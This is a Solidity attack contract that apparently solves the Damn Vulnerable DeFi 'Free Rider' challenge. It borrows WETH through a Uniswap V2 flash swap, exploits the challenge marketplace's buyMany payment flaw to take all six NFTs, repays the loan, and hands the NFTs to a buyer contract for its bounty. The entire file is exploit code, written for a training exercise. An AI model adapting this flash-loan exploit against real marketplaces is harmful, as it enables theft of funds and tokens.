// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
//import "hardhat/console.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";


interface UniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}


/**
 * @title FreeRiderAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
  UniswapV2Pair private uniswapPair;
  IWETH9 private weth;
  FreeRiderNFTMarketplace private marketplace;
  IERC721 private nft;
  FreeRiderBuyer private buyer;

  uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

  constructor(address _uniswapPair, address _weth, address payable _marketplace, address _nft, address _buyer) {
    uniswapPair = UniswapV2Pair(_uniswapPair);
    weth = IWETH9(_weth);
    marketplace = FreeRiderNFTMarketplace(_marketplace);
    nft = IERC721(_nft);
    buyer = FreeRiderBuyer(_buyer);
  }

  function attack(uint256 amount) external {
    uniswapPair.swap(amount, 0, address(this), new bytes(1));
  }

  function uniswapV2Call(address, uint amount0, uint, bytes calldata) external override {
    weth.withdraw(amount0);

    //console.log("address(this).balance: %s", address(this).balance);
    marketplace.buyMany{value: address(this).balance}(tokenIds);

    weth.deposit{value: address(this).balance}();
    weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));

    for (uint256 i = 0; i < tokenIds.length; i++) {
        nft.safeTransferFrom(address(this), address(buyer), i);
    }
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) 
    external
    pure
    override
    returns (bytes4) 
  {
    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}